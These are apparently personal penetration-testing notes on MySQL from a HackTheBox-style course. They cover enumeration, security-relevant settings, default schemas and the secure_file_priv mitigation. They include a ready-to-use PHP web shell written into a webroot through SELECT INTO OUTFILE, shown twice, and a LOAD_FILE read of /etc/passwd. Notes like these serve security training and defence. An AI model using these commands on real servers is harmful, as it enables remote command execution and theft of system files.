### webshell + file write
```shell-session
mysql> SELECT "<?php echo shell_exec($_GET['c']);?>" INTO OUTFILE '/var/www/html/webshell.php';
```
#### MySQL - Secure File Privileges
```shell-session
mysql> show variables like "secure_file_priv";
```

### read local files
```shell-session
mysql> select LOAD_FILE("/etc/passwd");
```


default port `3306`
can be made in the server configuration. The main options that are security-relevant are:

| **Settings**       | **Description**                                                                                              |
| ------------------ | ------------------------------------------------------------------------------------------------------------ |
| `user`             | Sets which user the MySQL service will run as.                                                               |
| `password`         | Sets the password for the MySQL user.                                                                        |
| `admin_address`    | The IP address on which to listen for TCP/IP connections on the administrative network interface.            |
| `debug`            | This variable indicates the current debugging settings                                                       |
| `sql_warnings`     | This variable controls whether single-row INSERT statements produce an information string if warnings occur. |
| `secure_file_priv` | This variable is used to limit the effect of data import and export operations.                              |
The settings `user`, `password`, and `admin_address` are security-relevant because the entries are made in plain text. Often, the rights for the configuration file of the MySQL server are not assigned correctly. 
If we get another way to read files or even a shell, we can see the file and the username and password for the MySQL server. 
Suppose there are no other security measures to prevent unauthorized access. In that case, the entire database and all the existing customers' information, email addresses, passwords, and personal data can be viewed and even edited.

The `debug` and `sql_warnings` settings provide verbose information output in case of errors, . This information often contains sensitive content, These error messages are often displayed directly on web applications. Accordingly, the SQL injections could be manipulated even to have the MySQL server execute system commands.

`MySQL` default system schemas/databases:

- `mysql` - is the system database that contains tables that store information required by the MySQL server
- `information_schema` - provides access to database metadata
- `performance_schema` - is a feature for monitoring MySQL Server execution at a low level
- `sys` - a set of objects that helps DBAs and developers interpret data collected by the Performance Schema
# 

```shell-session
mysql> SHOW DATABASES;

+--------------------+
| Database           |
+--------------------+
| information_schema |
| htbusers           |
+--------------------+
2 rows in set (0.00 sec)
```
### SELECT DB

```shell-session
USE htbusers;
```

#### Show Tables

```shell-session
mysql> SHOW TABLES;
```

## mysql RCE

### writing files and webshells

`MySQL` does not have a stored procedure like `xp_cmdshell`, but we can achieve command execution if we write to a location in the file system that can execute our commands. For example, suppose `MySQL` operates on a PHP-based web server or other programming languages like ASP.NET. If we have the appropriate privileges, we can attempt to write a file using [SELECT INTO OUTFILE](https://mariadb.com/kb/en/select-into-outfile/) in the webserver directory. Then we can browse to the location where the file is and execute our commands.

```shell-session
mysql> SELECT "<?php echo shell_exec($_GET['c']);?>" INTO OUTFILE '/var/www/html/webshell.php';

Query OK, 1 row affected (0.001 sec)
```

## Mitigation configuration (secure_file_priv)
In `MySQL`, a global system variable [secure_file_priv](https://dev.mysql.com/doc/refman/5.7/en/server-system-variables.html#sysvar_secure_file_priv) limits the effect of data import and export operations, such as those performed by the `LOAD DATA` and `SELECT â€¦ INTO OUTFILE` statements and the [LOAD_FILE()](https://dev.mysql.com/doc/refman/5.7/en/string-functions.html#function_load-file) function. These operations are permitted only to users who have the [FILE](https://dev.mysql.com/doc/refman/5.7/en/privileges-provided.html#priv_file) privilege.

`secure_file_priv` may be set as follows:

- If empty, the variable has no effect, which is not a secure setting.
- If set to the name of a directory, the server limits import and export operations to work only with files in that directory. The directory must exist; the server does not create it.
- If set to NULL, the server disables import and export operations.
In the following example, we can see the `secure_file_priv` variable is empty, which means we can read and write data using `MySQL`:



```shell-session
mysql> show variables like "secure_file_priv";

+------------------+-------+
| Variable_name    | Value |
+------------------+-------+
| secure_file_priv |       |
+------------------+-------+
```

 Read Local Files in MySQL
 
by default a `MySQL` installation does not allow arbitrary file read, but if the correct settings are in place and with the appropriate privileges, we can read files using the following methods:

`SHOW VARIABLES LIKE 'local_infile';`

```shell-session
mysql> select LOAD_FILE("/etc/passwd");
```

`mysql --local-infile=1 -u youruser -p`
